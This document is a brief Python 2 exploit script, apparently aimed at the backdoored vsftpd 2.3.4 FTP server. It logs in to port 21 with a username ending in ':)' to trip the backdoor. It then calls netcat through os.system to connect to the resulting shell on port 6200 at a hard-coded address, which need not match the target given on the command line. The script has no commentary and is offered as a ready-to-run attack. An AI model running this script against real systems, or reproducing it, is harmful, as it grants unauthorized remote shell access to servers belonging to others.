#!/usr/bin/python

import socket, sys, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(2046)

s.send("USER badfly:)\r\n")
r = s.recv(4096)
print r
s.send("PASS qualquer\r\n")
#r = s.recv(4096)
#print r

os.system("nc -nv 192.168.0.36 6200")
